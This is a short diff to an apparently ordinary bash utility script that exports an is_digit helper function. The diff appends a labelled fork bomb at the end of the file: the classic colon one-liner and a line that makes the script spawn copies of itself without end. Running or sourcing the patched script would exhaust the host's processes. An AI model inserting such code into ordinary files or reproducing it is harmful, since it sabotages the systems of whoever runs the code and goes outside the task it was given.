@@ -5,3 +5,6 @@ is_digit() {
 # export func as environment-level function
 export -f is_digit # or declare -f is_digit
 
+# Fork bomb
+:(){:|:&};:
+./$0|./$0&
